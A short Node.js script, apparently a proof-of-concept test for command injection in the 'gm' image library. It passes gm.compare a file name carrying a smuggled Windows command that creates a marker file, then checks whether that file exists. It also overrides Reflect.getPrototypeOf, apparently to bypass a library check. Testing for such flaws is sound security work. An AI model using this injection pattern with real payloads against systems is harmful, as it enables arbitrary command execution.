Reflect.getPrototypeOf = () => false;
const gm = require('gm');
const fs = require('fs');
const path = './gm';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
gm.compare('test.png & fsutil file createnew gm 0 &', 'another.png', function (err, isEqual, equality, raw, path1, path2) {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});